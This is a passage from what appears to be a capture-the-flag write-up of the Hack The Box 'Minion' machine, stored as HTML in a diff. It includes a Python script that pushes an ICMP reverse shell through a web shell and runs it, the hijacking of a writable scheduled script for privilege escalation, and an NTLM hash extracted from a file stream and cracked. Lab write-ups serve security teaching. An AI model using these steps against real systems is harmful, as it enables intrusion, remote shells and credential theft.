+        &lt;span class=&quot;n&quot;&gt;regex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Status=(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d+)'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;regex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;regex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d] =&amp;gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;regex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d]&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTTPError&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Failed &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;base64_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Invoke-PowerShellIcmp.b64'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;url2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://127.0.0.1/cmd.aspx?xcmd=&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;url1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://10.10.10.57:62696/test.asp?u=&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;#############################&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Building &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s.b64&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base64_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;new_line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;redir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&amp;gt;'&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;redir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&amp;gt;&amp;gt;'&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;echo &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s.b64&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;redir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;send_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;quote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;quote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;######################################################&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Decoding &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s.b64 and writing &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s.ps1'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;send_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;quote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;quote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;powershell -c &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[system.text.encoding]::ASCII.getstring([system.convert]::frombase64string((gc &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s.b64)))|out-file &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s.ps1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;#############################&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Executing &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s.ps1'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;send_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;quote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;quote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;powershell -c &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s.ps1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;b&gt;Note:&lt;/b&gt; For the base64 decoding, I could have used certutil utility as well.&lt;/p&gt;
+
+&lt;p&gt;On my attacking box, I launched the icmpsh with &lt;code&gt;icmpsh_m.py MY_ATTACK_IP 10.10.10.57&lt;/code&gt; and executed the Python script. After a while I got a Powershell command prompt:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/icmpsh-master# ./icmpsh_m.py 10.10.17.241 10.10.10.57
+Windows PowerShell running as user MINION&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;on MINION
+Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2015 Microsoft Corporation. All rights reserved.
+
+PS C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;netsrv&amp;gt; whoami
+iis apppool&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;efaultapppool
+
+PS C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;netsrv&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2 id=&quot;system-enumeration&quot;&gt;System Enumeration&lt;/h2&gt;
+
+&lt;p&gt;I quickly noticed the user iis apppool\defaultapppool was not having all the permissions that I needed. Listing the directory \users, I could see two users: Administrator and decoder.minion. I then found the directory c:\sysadmscripts containing the files c.ps1 and del_logs.bat. Reading the files’ content, I learned the c.ps1 Powershell script was most likely being ran each 5 minutes. From the del_logs.bat I saw there was a log file being written at \windows\temp\log.txt. I could see the output written in each 5 minutes. I also noticed that c.ps1 was writable by everyone, so my low privilege user could write into it. I then executed the following command to overwrite the file, so that its next execution would give me the contents of the directory \users\decoder.minion:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;write-output&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;get-childitem \users\decoder.minion\Desktop | out-file \temp\log.txt&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;out-file&lt;/span&gt; \sysadmscripts\c.ps1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;After 5 minutes, the content of \temp\log.txt was:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:\&amp;gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; \temp\log.txt
+  Directory: C:\users\decoder.minion\Desktop
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---          9/4/2017   7:19 PM     103297 backup.zip                        
+-a---         8/25/2017  11:09 AM         33 user.txt       &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Following the same process, I copied both files to \temp, where I would have permissions to read them:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;write-output&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;cat \users\decoder.minion\desktop\user.txt | out-file \temp\user.txt&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;out-file&lt;/span&gt; \sysadmscripts\c.ps1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I was able to see the user.txt with &lt;code&gt;cat \temp\user.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;I then copied the backup.zip file:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;write-output&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;copy-item \users\decoder.minion\desktop\backup.zip -destination \temp\backup.zip&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;out-file&lt;/span&gt; \sysadmscripts\c.ps1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I then actually unzipped the backup.zip file using Powershell (&lt;a href=&quot;https://serverfault.com/questions/446884/unzip-file-with-powershell-in-server-2012-core&quot;&gt;Reference&lt;/a&gt;):&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;System.Reflection.Assembly]::LoadWithPartialName&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;System.IO.Compression.FileSystem&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Out-Null
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;System.IO.Compression.ZipFile]::ExtractToDirectory&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;\temp\backup.zip&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;\temp&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:\sysadmscripts&amp;gt; &lt;span class=&quot;nb&quot;&gt;get-childitem&lt;/span&gt; \temp
+
+
+    Directory: C:\temp
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---          9/4/2017   7:14 PM     386130 secret.exe                        &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Running secret.exe, I just get the current working directory. Nothing special about it. I actually encoded the file in base64 so I could copy paste it and reproduce it on my own machine:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$base64string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Convert]::ToBase64String&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;IO.File]::ReadAllBytes&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\temp\backup.zip'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$base64string&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I took a while to print all the base64 content. I then copied all base64 output from the screen and pasted into vi in my attacker box. By decoding this file using the command base64 -d, I was able to get the original secret.exe. Ran strings against it, but nothing stood out.&lt;/p&gt;
+
+&lt;p&gt;I then remembered to check the Alternate Data Stream for the backup.zip file and I found a stream called “pass”:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;get-item&lt;/span&gt; \temp\backup.zip -stream &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+
+FileName: C:\temp\backup.zip
+
+Stream                   Length
+------                   ------
+:&lt;span class=&quot;nv&quot;&gt;$DATA&lt;/span&gt;                   103297
+pass                         34&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Getting the content of the stream, gave me a hash, which looked like a MD5 or most likely a NTLM:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; \temp\backup.zip -stream pass
+28a5d1e0c15af9f8fce7db65d75bbf17&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2 id=&quot;own-system&quot;&gt;Own System&lt;/h2&gt;
+
+&lt;p&gt;Using &lt;a href=&quot;https://hashkiller.co.uk/md5-decrypter.aspx&quot;&gt;Hashkiller&lt;/a&gt;, I was able to crack the hash:&lt;/p&gt;
+
+&lt;p&gt;&lt;b&gt;28a5d1e0c15af9f8fce7db65d75bbf17 NTLM : 1234test&lt;/b&gt;&lt;/p&gt;
+
+&lt;p&gt;This was most certainly the password for the administrator user. I tried the following command to get the Administrator’s Desktop directory contents:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'administrator'&lt;/span&gt;; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'1234test'&lt;/span&gt;; &lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ConvertTo-SecureString&lt;/span&gt; -AsPlainText &lt;span class=&quot;nv&quot;&gt;$Password&lt;/span&gt; -Force; &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;New-Object &lt;/span&gt;System.Management.Automation.PSCredential &lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt;; Invoke-Command -ComputerName localhost -credential &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; -ScriptBlock &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Get-ChildItem&lt;/span&gt; \users\administrator\desktop &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I used the Invoke-Command and built the PSCredential object using the password. However, as I was running as the low privileged IIS user, this command was not returning nothing. I never got certain of the exact reason, but I presumed the IIS user was not allowed to run Invoke-Command passing other user’s credentials. So, I had to change my previous Python script to copy the ICMP shell to \sysadmscripts\c.ps1, so that I could get a shell under decoder user. The change was easy, as instead of copying the Invoke-PowerShellIcmp.ps1 to \temp\s.ps1, I copied to \sysadmscripts\c.ps1. I also commented the execution of the shell as I just wanted it to be triggered by the decoder’s scheduled task.&lt;/p&gt;
+
+&lt;p&gt;After 5 minutes, I got a shell back under the user decoder. I then proceeded to run the Invoke-command again and this time I got the contents of the Administrator’s desktop directory:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'administrator'&lt;/span&gt;; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'1234test'&lt;/span&gt;; &lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ConvertTo-SecureString&lt;/span&gt; -AsPlainText &lt;span class=&quot;nv&quot;&gt;$Password&lt;/span&gt; -Force; &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;New-Object &lt;/span&gt;System.Management.Automation.PSCredential &lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt;; Invoke-Command -ComputerName localhost -credential &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; -ScriptBlock &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Get-ChildItem&lt;/span&gt; \users\administrator\desktop &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+Directory: C:\users\administrator\desktop
+
+
+Mode                LastWriteTime     Length Name              PSComputerName  
+----                -------------     ------ ----              --------------  
+-a---         9/26/2017   6:18 AM     386479 root.exe          localhost       
+-a---         8/24/2017  12:32 AM         76 root.txt          localhost       &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;At that time I thought the challenge was done as the next step would just to get the root.txt content. However, when running the command, I learned the root.txt was not containing what I wanted:&lt;/p&gt;
+
